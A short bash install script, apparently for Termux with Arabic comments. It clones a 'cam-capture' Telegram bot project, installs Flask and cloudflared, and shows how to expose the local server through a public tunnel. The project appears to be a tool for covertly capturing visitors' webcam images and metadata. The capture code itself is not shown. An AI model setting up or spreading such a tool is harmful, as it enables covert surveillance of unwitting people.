#!/bin/bash

PROJECT_DIR="$HOME/cam-capture"

echo "📦 Installing project..."

# تحديث النظام
pkg update -y && pkg upgrade -y

# تثبيت الأدوات الأساسية
pkg install -y python git cloudflared

# إنشاء مجلد المشروع
rm -rf $PROJECT_DIR
git clone https://github.com/aissaboukortt/I-catch-you-Bot.git $PROJECT_DIR

cd $PROJECT_DIR || exit

echo "📦 Installing Python dependencies..."

# تثبيت مكتبات Python
pip install flask python-telegram-bot

# إنشاء المجلدات
mkdir -p images
mkdir -p sent
mkdir -p metadata

# إعطاء صلاحيات (اختياري)
chmod +x app.py
chmod +x bot.py

echo "✅ Installation completed!"
echo ""
echo "🚀 To run bot (recommended):"
echo "cd $PROJECT_DIR && python bot.py"
echo ""
echo "🚀 Or run server manually:"
echo "python app.py"
echo ""
echo "🌍 Cloudflare (if needed):"
echo "cloudflared tunnel --url http://localhost:5000"
